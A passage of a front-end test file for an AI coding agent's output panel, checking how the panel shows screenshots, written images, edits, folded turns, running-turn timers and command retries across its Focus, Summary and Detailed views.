    messageStore.setViewMode(SID, 'detailed');
    const { container } = render(OutputPanel, { sessionId: SID });
    await tick();

    expect(container.querySelector('details[data-notes]')).toBeNull();
    expect(container.querySelector('[data-msg-id="n1"]')).not.toBeNull();
  });
});

describe('OutputPanel images from the agent', () => {
  // The lightbox loads on first use (LazyImageLightbox). Load it here once,
  // since transforming it cold can take longer than a test waits for the
  // dialog on a slow runner, as with Help (TitleBar.svelte.test.ts).
  beforeAll(async () => { await import('./ImageLightbox.svelte'); }, 30_000);

  const SHOT = { file: `${'a'.repeat(32)}.png` };

  it('steps through the images of the whole thread, and gives a thumbnail only its own menu', async () => {
    const MOCK = { file: `${'b'.repeat(32)}.png`, name: 'mock.png' };
    messageStore.messagesBySession = {
      [SID]: [
        { kind: 'user', id: 'u1', text: 'Match this', uuid: 'uuid-1', images: [MOCK] },
        { kind: 'tool_call', id: 't1', toolName: 'mcp__playwright__browser_take_screenshot', toolInput: {}, toolUseId: 'tu1', uuid: 'u1', pending: false, images: [SHOT] },
      ],
    };
    messageStore.setViewMode(SID, 'focus');
    render(OutputPanel, { sessionId: SID });
    await tick();

    await fireEvent.contextMenu(screen.getByRole('button', { name: 'View mock.png' }), { clientX: 5, clientY: 5 });
    // The image menu loads with the lightbox's code; the thread's would show at once.
    const menu = await screen.findByRole('menu', { name: 'Image actions' });
    expect(screen.getAllByRole('menu')).toHaveLength(1);
    expect(within(menu).getAllByRole('menuitem').map((i) => i.textContent?.trim())).toEqual(['Download', 'Open file location']);
    await fireEvent.keyDown(window, { key: 'Escape' });

    await fireEvent.click(screen.getByRole('button', { name: 'View mock.png' }));
    const dialog = await screen.findByRole('dialog');
    expect(within(dialog).getByTestId('lightbox-position')).toHaveTextContent('1 of 2');
    await fireEvent.keyDown(dialog, { key: 'ArrowRight' });
    expect(dialog.querySelector('img')).toHaveAttribute('src', `grove-attachment://image/${SID}/${SHOT.file}`);
  });

  it('keeps a screenshot a tool returned in Focus, without the tool call', async () => {
    messageStore.messagesBySession = {
      [SID]: [
        { kind: 'tool_call', id: 't1', toolName: 'mcp__playwright__browser_take_screenshot', toolInput: {}, toolUseId: 'tu1', uuid: 'u1', pending: false, images: [SHOT] },
        { kind: 'tool_call', id: 't2', toolName: 'Grep', toolInput: { pattern: 'needle' }, toolUseId: 'tu2', uuid: 'u2', pending: false },
      ],
    };
    messageStore.setViewMode(SID, 'focus');
    const { container } = render(OutputPanel, { sessionId: SID });
    await tick();

    expect(container.querySelector('[data-msg-id="t1"] img')).toHaveAttribute('src', `grove-attachment://image/${SID}/${SHOT.file}`);
    expect(container.querySelector('[data-msg-id="t1"]')!.textContent).not.toContain('browser_take_screenshot');
    expect(container.querySelector('[data-msg-id="t2"]')).toBeNull();
  });

  it("shows a subagent's screenshots under its line in the thread", async () => {
    messageStore.messagesBySession = {
      [SID]: [
        { kind: 'tool_call', id: 'a1', toolName: 'Agent', toolInput: { description: 'Check the UI', subagent_type: 'general-purpose' }, toolUseId: 'tu-agent', uuid: 'u1', pending: false, result: 'Looks fine' },
        { kind: 'tool_call', id: 's1', toolName: 'mcp__playwright__browser_take_screenshot', toolInput: {}, toolUseId: 'tu-sub', uuid: 'u2', pending: false, images: [SHOT], parentToolUseId: 'tu-agent' },
      ],
    };
    messageStore.setViewMode(SID, 'summary');
    const { container } = render(OutputPanel, { sessionId: SID });
    await tick();

    expect(container.querySelector('[data-msg-id="a1"] img')).toHaveAttribute('src', `grove-attachment://image/${SID}/${SHOT.file}`);
  });

  it('shows an image file the agent wrote under the Write, but not one it deleted or moved', async () => {
    messageStore.messagesBySession = {
      [SID]: [
        { kind: 'tool_call', id: 'w1', toolName: 'Write', toolInput: { file_path: 'chart.svg', content: '<svg/>' }, toolUseId: 'tu1', uuid: 'u1', pending: false },
        { kind: 'tool_call', id: 'd1', toolName: 'delete', toolInput: {}, toolView: { kind: 'edit', path: 'assets/logo.png' }, toolUseId: 'tu2', uuid: 'u2', pending: false },
      ],
    };
    messageStore.setViewMode(SID, 'detailed');
    const { container } = render(OutputPanel, { sessionId: SID });
    await tick();

    expect(container.querySelector('[data-msg-id="w1"] img')).toHaveAttribute('src', `grove-attachment://worktree/${SID}/chart.svg`);
    expect(container.querySelector('[data-msg-id="d1"] img')).toBeNull();
  });

  it("leaves out a written image's preview when it won't load", async () => {
    messageStore.messagesBySession = {
      [SID]: [{ kind: 'tool_call', id: 'w1', toolName: 'Write', toolInput: { file_path: '/tmp/chart.svg', content: '<svg/>' }, toolUseId: 'tu1', uuid: 'u1', pending: false }],
    };
    messageStore.setViewMode(SID, 'detailed');
    const { container } = render(OutputPanel, { sessionId: SID });
    await tick();

    await fireEvent.error(container.querySelector('[data-msg-id="w1"] img')!);
    expect(container.querySelector('[data-msg-id="w1"] img')).toBeNull();
    expect(container.querySelector('[data-msg-id="w1"]')!.textContent).not.toContain('Image not available');
  });

  it('lists the files a turn made in every view', async () => {
    messageStore.messagesBySession = {
      [SID]: [{ kind: 'files_made', id: 'f1', files: [{ path: 'shots/home.png', kind: 'image', size: 70, image: SHOT }, { path: 'report.pdf', kind: 'pdf', size: 9 }] }],
    };
    for (const mode of ['detailed', 'summary', 'focus'] as const) {
      messageStore.setViewMode(SID, mode);
      const { container, unmount } = render(OutputPanel, { sessionId: SID });
      await tick();
      expect(container.querySelector('[data-msg-id="f1"]')!.textContent).toContain('report.pdf');
      unmount();
    }
  });
});

describe('OutputPanel: an edit in the thread', () => {
  afterEach(() => {
    // What the events below leave behind: the turn as running, and its activity.
    messageStore.isRunning = {};
    messageStore.activityBySession = {};
    messageStore.streamingText = {};
  });

  it("isn't diffed again as the turns after it come in", async () => {
    store.activeSessionId = SID;
    const edit: ChatMessage = { kind: 'tool_call', id: 'e1', toolName: 'Edit', toolInput: { file_path: 'a.ts', old_string: 'let a = 1;', new_string: 'let a = 2;' }, toolUseId: 'tu-e1', uuid: 'a1', pending: false, result: 'ok' };
    messageStore.messagesBySession = { [SID]: [{ kind: 'user', id: 'u1', text: 'go' }, edit] };
    messageStore.setViewMode(SID, 'detailed');
    const { container } = render(OutputPanel, { sessionId: SID });
    await tick();
    expect(container).toHaveTextContent('let a = 2;');
    vi.mocked(createPatch).mockClear();

    // Each of these used to rebuild every row, and every edit's diff with it.
    messageStore.ingestEvent(SID, { type: 'assistant_text', text: 'Now the tests', uuid: 'a2' });
    await tick();
    messageStore.ingestEvent(SID, { type: 'assistant_tool_use', toolName: 'Read', toolInput: { file_path: 'b.ts' }, toolUseId: 'tu-r1', uuid: 'a3' });
    await tick();
    messageStore.ingestEvent(SID, { type: 'tool_result', toolUseId: 'tu-r1', content: 'contents' });
    await tick();

    expect(container).toHaveTextContent('Now the tests');
    expect(createPatch).not.toHaveBeenCalled();
  });
});

describe('OutputPanel: turns in Summary', () => {
  const prompt = (id: string, text = `prompt ${id}`): ChatMessage => ({ kind: 'user', id, text, uuid: `uu-${id}` });
  const reply = (id: string): ChatMessage => ({ kind: 'text', id, text: `answer ${id}`, uuid: `ua-${id}` });
  const done = (id: string): ChatMessage => ({ kind: 'result', id, subtype: 'success', isError: false, durationMs: 41_000 });
  const bash = (id: string, command: string, isError = false): ChatMessage => ({
    kind: 'tool_call', id, toolName: 'Bash', toolInput: { command }, toolUseId: `tu-${id}`, uuid: '', pending: false,
    result: isError ? 'FAIL' : 'PASS', ...(isError ? { isError: true } : {}),
  });

  beforeEach(() => {
    store.activeSessionId = SID;
    messageStore.setViewMode(SID, 'summary');
  });
  afterEach(() => {
    messageStore.isRunning = {};
    messageStore.viewModeBySession = {};
    messageStore.activityBySession = {};
    messageStore.streamingText = {};
    vi.restoreAllMocks();
  });

  it('folds turns before the last two to one line, and opens one when clicked', async () => {
    messageStore.messagesBySession = {
      [SID]: [prompt('u1', 'first\nsecond line'), reply('a1'), done('r1'), prompt('u2'), reply('a2'), done('r2'), prompt('u3'), reply('a3'), done('r3')],
    };
    const { container } = render(OutputPanel, { sessionId: SID });
    await tick();

    const first = container.querySelector('[data-turn="u1"]')!;
    expect(first.querySelector('[data-msg-id="a1"]')).toBeNull();
    const line = within(first as HTMLElement).getByRole('button', { name: /first/ });
    expect(line).toHaveTextContent('41s');
    expect(line).not.toHaveTextContent('second line');
    expect(container.querySelector('[data-msg-id="a2"]')).not.toBeNull();
    expect(container.querySelector('[data-msg-id="a3"]')).not.toBeNull();

    await fireEvent.click(line);
    expect(first.querySelector('[data-msg-id="a1"]')).not.toBeNull();
    // And folds again from its header.
    await fireEvent.click(within(first as HTMLElement).getByRole('button', { name: 'Fold this turn' }));
    expect(first.querySelector('[data-msg-id="a1"]')).toBeNull();
  });

  it("keeps a running turn's steps folded and says what it waits on, with a timer", async () => {
    messageStore.messagesBySession = {
      [SID]: [
        prompt('u1'), reply('a1'), done('r1'),
        { ...prompt('u2'), sentAt: Date.now() - 64_000 } as ChatMessage, bash('b1', 'ls'),
        { kind: 'permission', id: 'p1', requestId: 'rq', toolName: 'Bash', toolInput: { command: 'npm run migrate' }, toolUseId: 'tu-p', resolved: false },
      ],
    };
    messageStore.setIsRunning(SID, true);
    const { container } = render(OutputPanel, { sessionId: SID });
    await tick();

    const live = container.querySelector('[data-turn="u2"]') as HTMLElement;
    const summary = within(live).getByRole('button', { name: /Waiting for you/ });
    expect(summary).toHaveTextContent('1m 4s');
    expect(summary).toHaveAttribute('aria-expanded', 'false');
    // Worded as the sidebar words it.
    expect(live).toHaveTextContent('Wants to run a command: npm run migrate');
    expect(live.querySelector('[data-msg-id="b1"]')).toBeNull();
    expect(live.querySelector('[data-msg-id="p1"]')).not.toBeNull();
    // A running turn can't be folded away.
    expect(within(live).queryByRole('button', { name: 'Fold this turn' })).toBeNull();

    await fireEvent.click(summary);
    expect(live.querySelector('[data-msg-id="b1"]')).not.toBeNull();
  });

  it('says what a running turn is doing under its summary line', async () => {
    messageStore.messagesBySession = { [SID]: [prompt('u1'), bash('b1', 'ls')] };
    messageStore.setIsRunning(SID, true);
    messageStore.activityBySession = { [SID]: { activity: 'tool_starting', toolName: 'Bash', toolSummary: 'npm test' } };
    const { container } = render(OutputPanel, { sessionId: SID });
    await tick();

    const live = container.querySelector('[data-turn="u1"]') as HTMLElement;
    expect(live).toHaveTextContent('Running Bash npm test');
    // Once, in the turn: not again under the thread.
    expect(container.textContent!.split('Running Bash').length - 1).toBe(1);
  });

  it("keeps a running turn's newest note in view, replaced as the next comes, not shown and then folded", async () => {
    const note = (id: string, text: string): ChatMessage => ({ kind: 'text', id, text, uuid: `u-${id}` });
    messageStore.messagesBySession = { [SID]: [prompt('u1'), note('n1', 'Let me check the config')] };
    messageStore.setIsRunning(SID, true);
    const { container } = render(OutputPanel, { sessionId: SID });
    await tick();
    expect(container.querySelector('[data-msg-id="n1"]')).toHaveTextContent('Let me check the config');

    // A tool call after it makes it a note: it stays where it was.
    messageStore.messagesBySession = { [SID]: [prompt('u1'), note('n1', 'Let me check the config'), bash('b1', 'cat config.json')] };
    await tick();
    expect(container.querySelector('[data-msg-id="n1"]')).not.toBeNull();
    expect(container.querySelector('[data-msg-id="b1"]')).toBeNull();

    // The next note takes its place.
    messageStore.messagesBySession = { [SID]: [prompt('u1'), note('n1', 'Let me check the config'), bash('b1', 'cat config.json'), note('n2', 'Now the tests')] };
    await tick();
    expect(container.querySelector('[data-msg-id="n1"]')).toBeNull();
    expect(container.querySelector('[data-msg-id="n2"]')).toHaveTextContent('Now the tests');

    // The turn ends: the answer is in view; the earlier note folds with the steps.
    messageStore.messagesBySession = { [SID]: [prompt('u1'), note('n1', 'Let me check the config'), bash('b1', 'cat config.json'), note('n2', 'Fixed it'), done('r1')] };
    messageStore.setIsRunning(SID, false);
    await tick();
    expect(container.querySelector('[data-msg-id="n2"]')).toHaveTextContent('Fixed it');
    expect(container.querySelector('[data-msg-id="n1"]')).toBeNull();
  });

  it("shows an image the agent wrote while the turn's steps are folded", async () => {
    messageStore.messagesBySession = {
      [SID]: [prompt('u1'), { kind: 'tool_call', id: 'w1', toolName: 'Write', toolInput: { file_path: 'chart.svg', content: '<svg/>' }, toolUseId: 'tu-w1', uuid: '', pending: false, result: 'ok' }, reply('a1'), done('r1')],
    };
    const { container } = render(OutputPanel, { sessionId: SID });
    await tick();
    expect(container.querySelector('[data-msg-id="w1"] img')).toHaveAttribute('src', `grove-attachment://worktree/${SID}/chart.svg`);
  });

  it('draws the summary line as text, not a button, for a turn with no steps', async () => {
    messageStore.messagesBySession = { [SID]: [prompt('u1'), reply('a1'), done('r1')] };
    const { container } = render(OutputPanel, { sessionId: SID });
    await tick();
    const turn = container.querySelector('[data-turn="u1"]') as HTMLElement;
    expect(turn).toHaveTextContent('Worked 41s');
    expect(within(turn).queryByRole('button', { name: /Worked 41s/ })).toBeNull();
  });

  it("asks whether it's a plan when a turn has a cost and that isn't known yet", async () => {
    const refresh = vi.spyOn(usageStore, 'refresh').mockResolvedValue();
    messageStore.messagesBySession = { [SID]: [prompt('u1'), reply('a1'), { ...done('r1'), totalCostUsd: 0.41 } as ChatMessage] };
    render(OutputPanel, { sessionId: SID });
    await tick();
    expect(refresh).toHaveBeenCalledWith(SID);
  });

  it('links a command that failed to the run that passed, and says so in the strip', async () => {
    messageStore.messagesBySession = {
      [SID]: [prompt('u1'), bash('f1', 'npm test', true), bash('p1', 'npm test'), reply('a1'), done('r1')],
    };
    const { container, getByRole } = render(OutputPanel, { sessionId: SID });
    await tick();

    const strip = getByRole('button', { name: /Worked 41s/ });
    // In words for screen readers and the tooltip; shown as an icon, a
    // count and the failure.
    expect(strip).toHaveTextContent('2 commands, 1 failed, passed on retry');
    expect(strip.querySelector('[title="2 commands, 1 failed, passed on retry"]')).toHaveTextContent('2 (1 failed → passed)');
    expect(strip).toHaveAttribute('aria-expanded', 'false');

    await fireEvent.click(strip);
    Element.prototype.scrollIntoView = vi.fn();
    const passed = getByRole('button', { name: 'Passed on retry: show the run that passed' });
    expect(passed).toHaveTextContent('→ passed ↓');
    await fireEvent.click(passed);
    expect(Element.prototype.scrollIntoView).toHaveBeenCalledTimes(1);
    expect(container.querySelector('[data-msg-id="p1"] .ring-1')).not.toBeNull();
    expect(getByRole('button', { name: 'A retry of a run that failed: show that run' })).toHaveTextContent('← retry ↑');
  });

  it('draws each step on one line, with the whole step a click away', async () => {
    messageStore.messagesBySession = {
      [SID]: [
        prompt('u1'),
        { kind: 'tool_call', id: 'e1', toolName: 'Edit', toolInput: { file_path: 'a.ts', old_string: 'let a = 1;', new_string: 'let a = 2;' }, toolUseId: 'tu-e1', uuid: '', pending: false, result: 'ok' },
        bash('b1', 'npm test'),
        reply('a1'), done('r1'),
      ],
    };
    const { container, getByRole } = render(OutputPanel, { sessionId: SID });
    await tick();
    await fireEvent.click(getByRole('button', { name: /Worked 41s/ }));

    const editLine = container.querySelector('[data-msg-id="e1"]')!;
    // The kind of step is an icon, with its word as the tooltip.
    expect(within(editLine as HTMLElement).getByTitle('Edited')).toBeInTheDocument();
    expect(editLine).toHaveTextContent('a.ts');
    expect(editLine).toHaveTextContent('+1 −1');
    // The diff waits for a click.
    expect(editLine).not.toHaveTextContent('let a = 2;');
    await fireEvent.click(within(editLine as HTMLElement).getByRole('button', { name: /a\.ts/ }));
    expect(editLine).toHaveTextContent('let a = 2;');
    // Opened, it doesn't name the file again: the line already does.
    expect(editLine.textContent!.split('a.ts').length - 1).toBe(1);

    const runLine = container.querySelector('[data-msg-id="b1"]')!;
    expect(within(runLine as HTMLElement).getByTitle('Ran')).toBeInTheDocument();
    expect(runLine).toHaveTextContent('npm test');
    expect(runLine).not.toHaveTextContent('$');
    await fireEvent.click(within(runLine as HTMLElement).getByRole('button', { name: /npm test/ }));
    expect(runLine).toHaveTextContent('PASS');
    expect(runLine.textContent!.split('npm test').length - 1).toBe(1);
  });

  it('shows only the last five steps of a running turn when opened, and the rest on asking', async () => {
    const steps = Array.from({ length: 8 }, (_, i) => bash(`b${i}`, `step ${i}`));
    messageStore.messagesBySession = { [SID]: [prompt('u1'), ...steps] };
    messageStore.setIsRunning(SID, true);
    const { container, getByRole } = render(OutputPanel, { sessionId: SID });
    await tick();

    const drawnSteps = () => steps.filter((s) => container.querySelector(`[data-msg-id="${s.id}"]`)).map((s) => s.id);
    expect(drawnSteps()).toEqual([]);
    await fireEvent.click(getByRole('button', { name: /Working/ }));
    expect(drawnSteps()).toEqual(['b3', 'b4', 'b5', 'b6', 'b7']);
    await fireEvent.click(getByRole('button', { name: 'Show 3 earlier steps' }));
    expect(drawnSteps()).toHaveLength(8);
  });

  it("opens a folded turn and its steps to jump to a message in them", async () => {
    Element.prototype.scrollIntoView = vi.fn();
    messageStore.messagesBySession = {
      [SID]: [prompt('u1'), bash('b1', 'ls'), reply('a1'), done('r1'), prompt('u2'), reply('a2'), done('r2'), prompt('u3'), reply('a3'), done('r3')],
    };
    vi.spyOn(messageStore, 'loadOlderUntil').mockResolvedValue();
    vi.spyOn(messageStore, 'findMessageForEvent').mockResolvedValue('b1');
    const { container } = render(OutputPanel, { sessionId: SID });
    await tick();
    expect(container.querySelector('[data-msg-id="b1"]')).toBeNull();

    messageStore.requestJump(SID, { eventIndex: 3, uuid: null, bookmarkId: 'B' });
    await vi.waitFor(() => expect(container.querySelector('[data-msg-id="b1"]')).not.toBeNull());
    // Still Summary: nothing had to switch views to find it.
    expect(messageStore.getViewMode(SID)).toBe('summary');
    await vi.waitFor(() => expect(Element.prototype.scrollIntoView).toHaveBeenCalled());
  });

  it('draws messages before the first prompt as rows, as Summary did', async () => {
    messageStore.messagesBySession = {
      [SID]: [{ kind: 'thinking', id: 't0', thinking: 'hmm' }, { kind: 'system', id: 's0', text: 'Connected' }, prompt('u1'), reply('a1')],
    };
    const { container } = render(OutputPanel, { sessionId: SID });
    await tick();

    expect(container.querySelector('[data-msg-id="t0"]')).toBeNull();
    expect(container.querySelector('[data-msg-id="s0"]')!.closest('[data-turn]')).toBeNull();
    expect(container.querySelector('[data-msg-id="a1"]')!.closest('[data-turn]')).toHaveAttribute('data-turn', 'u1');
  });
});
